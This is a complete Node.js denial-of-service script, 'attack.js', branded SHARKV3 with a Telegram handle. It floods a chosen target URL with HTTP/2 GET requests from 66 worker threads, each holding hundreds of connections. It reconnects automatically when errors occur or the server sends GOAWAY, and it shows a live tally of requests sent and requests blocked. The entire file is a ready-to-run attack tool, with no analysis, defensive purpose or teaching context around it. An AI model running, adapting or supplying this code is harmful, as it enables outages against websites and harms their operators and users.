const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const net = require('net');

const THREADS = 22;
const POWER_MULTIPLIER = 2;
const MAX_INFLIGHT = 2000;
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;  // Define the `end` variable here for the main thread

// Helper function to get a random number within a range (inclusive)
function getRandomInRange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    end = Date.now() + duration * 1000; // Define end time here in the main thread

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`SHARKV3! - NO CPU WARMUP .exx`);

    // Start the workers with dynamic connection numbers
    for (let i = 0; i < THREADS; i++) {
        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
    }

    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
    }

    // Live Stats
    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);

        // Remaining time calculation
        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
        const minutesRemaining = Math.floor(timeRemaining / 60);
        const secondsRemaining = Math.floor(timeRemaining % 60);

        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
        console.log(`===========================`);
        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

} else {
    const { target, duration, initial, connections } = workerData;
    const endTime = Date.now() + duration * 1000;  // end time for worker threads

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > endTime || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const req = client.request({ ':method': 'GET', ':path': '/' });

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });

                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        // Slight delay to avoid killing the system
        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
    }

    function createConnection() {
        if (Date.now() > endTime) return;

        let client;
        try {
            client = http2.connect(target);

            const inflight = { count: 0 };

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 5000); // auto-recover fast
            });

            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 5000));

            client.on('connect', () => {
                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
            });
        } catch {
            setTimeout(createConnection, 1000);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
